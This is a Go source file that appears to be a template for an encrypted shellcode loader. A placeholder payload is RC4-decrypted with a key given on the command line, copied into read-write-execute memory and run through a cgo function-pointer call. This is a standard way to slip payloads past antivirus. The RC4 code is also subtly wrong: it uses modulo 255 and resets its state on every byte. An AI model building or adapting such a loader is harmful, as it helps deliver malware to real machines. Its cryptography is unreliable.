package main

import "fmt"
import "unsafe"
import "syscall"
import "os"

/*
void call(char *code) {
	    int (*ret)() = (int(*)())code;
	        ret();
	}
*/
import "C"

const encrypted_shellcode string = "SHELLCODEMARKER"

// returns byte slice and accepts string, converts key string to bytearray
func rc4_ksa(key string) []byte {
	keyArray := []byte(key)
	var S []byte
	S = make([]byte, 256)
	for i := 0; i < 256; i++ {
		// initialize box
		S[i] = byte(i)
	}
	// randomize the box with the key
	var j byte = 0
	for i := 0; i < 256; i++ {
		j = (j + S[i] + keyArray[i%len(keyArray)]) % 255
		S[i], S[j] = S[j], S[i]
	}

	return S

}

func rc4_prga(sBox []byte, c byte) byte {
	var i byte = 0
	var j byte = 0

	i = (i + 1) % 255
	j = (j + sBox[i]) % 255
	sBox[i], sBox[j] = sBox[j], sBox[i]
	K := sBox[(sBox[i]+sBox[j])%255]
	// xor with c byte
	K = K ^ c
	return K
}

func rc4_run(key string, data string) []byte {
	sBox := rc4_ksa(key)
	// encrypt the text with initialized box sBox
	// convert text to bytearray
	sArr := []byte(data)

	// initialize result bytearray to grow it later on
	var rArr []byte
	rArr = make([]byte, 0)

	for x := 0; x < len(sArr); x++ {
		K := rc4_prga(sBox, sArr[x])
		rArr = append(rArr, K)

	}
	/*
		for x := 0; x < len(rArr); x++ {
			fmt.Printf(fmt.Sprintf("\\x%02x", rArr[x]))
		}
		fmt.Println()
	*/
	//fmt.Sprintf("\\x%x", rArr)
	//fmt.Println(rArr)
	return rArr
}

func run_sh(shellcode []byte) bool {
	b, e := syscall.Mmap(0, 0, len(shellcode), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANON|syscall.MAP_SHARED)
	copy(b, shellcode)
	if e != nil {
		fmt.Println("error thrown:\t")
		fmt.Println(e)
	}
	//fmt.Println(b)
	C.call((*C.char)(unsafe.Pointer(&b[0])))
	return true
}

func main() {

	if len(os.Args) > 1 {
		key := os.Args[1]
		rArr := rc4_run(key, encrypted_shellcode)

		if rArr != nil {

			//fmt.Printf("Done")
			// Execute shellcode in a executable memory block
			run_sh(rArr)
		}

	} else {
		// be silent?
		fmt.Println("Key required!")
	}

}
